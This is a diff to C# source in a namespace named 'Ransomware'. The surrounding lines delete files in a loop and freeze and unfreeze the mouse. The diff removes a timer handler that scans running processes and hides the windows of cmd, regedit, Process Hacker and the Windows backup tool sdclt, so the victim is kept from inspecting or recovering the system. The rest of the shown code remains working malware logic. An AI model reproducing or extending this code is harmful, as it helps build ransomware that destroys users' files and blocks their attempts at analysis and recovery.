@@ -58,7 +58,6 @@ namespace Ransomware
             foreach (string file2 in filesPaths)
                 File.Delete(file2);
             
-            tmr_if.Start(); 
             tmr_hide.Start(); 
             tmr_show.Start();
             
@@ -153,40 +152,6 @@ namespace Ransomware
             Location = new Point(500, 500);
             UnFreezeMouse(); //Unfreeze mouse
         }
-
-
-         private void tmr_if_Tick(object sender, EventArgs e)
-        {
-            tmr_if.Stop();
-            int hWnd;
-            Process[] processRunning = Process.GetProcesses();
-            foreach (Process pr in processRunning)
-            {
-                if (pr.ProcessName == "cmd")
-                {
-                    hWnd = pr.MainWindowHandle.ToInt32();
-                    ShowWindow(hWnd, SW_HIDE);
-                }
-
-                if (pr.ProcessName == "regedit")
-                {
-                    hWnd = pr.MainWindowHandle.ToInt32();
-                    ShowWindow(hWnd, SW_HIDE);
-                }
-
-                if (pr.ProcessName == "Processhacker")
-                {
-                    hWnd = pr.MainWindowHandle.ToInt32();
-                    ShowWindow(hWnd, SW_HIDE);
-                }
-
-                if (pr.ProcessName == "sdclt")
-                {
-                    hWnd = pr.MainWindowHandle.ToInt32();
-                    ShowWindow(hWnd, SW_HIDE);
-                }
-            }
-
 
          public static void FreezeMouse() //Freeze Mouse
         {
